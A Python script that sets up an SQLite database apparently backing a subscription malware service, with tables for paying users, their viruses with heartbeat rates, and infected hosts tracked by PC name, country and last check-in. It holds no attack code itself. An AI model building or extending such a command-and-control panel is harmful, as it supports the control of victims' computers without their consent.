import sqlite3
# Set up a connection to the database file
conn = sqlite3.connect('instance/databasen.db')

# Set up a cursor object to execute SQL commands
cursor = conn.cursor()

#  Create the "User,Virus and Hosts" table if it does not already exist
# User public and private key gets used in the making of the virus to ensure encrypted communication between virus and user on dashboard
cursor.execute('''
    CREATE TABLE IF NOT EXISTS User (
        id INTEGER PRIMARY KEY,
        email TEXT,
        password TEXT,
        public_key TEXT,
        private_key TEXT,
        subscription_status TEXT
    )
''')
cursor.execute('''
    CREATE TABLE IF NOT EXISTS Virus (
        id INTEGER PRIMARY KEY,
        virus_type TEXT,
        name TEXT,
        heartbeat_rate TEXT,
        user_id INTEGER
    )
''')
cursor.execute('''
    CREATE TABLE IF NOT EXISTS Hosts (
        id INTEGER PRIMARY KEY,
        pc_name TEXT,
        country TEXT,
        host_notes TEXT,
        settings TEXT,
        last_heartbeat TEXT,
        user_id INTEGER,
        virus_id INTEGER
    )
''')
# Commit the changes to the database
conn.commit()

# Close the connection to the database
conn.close()
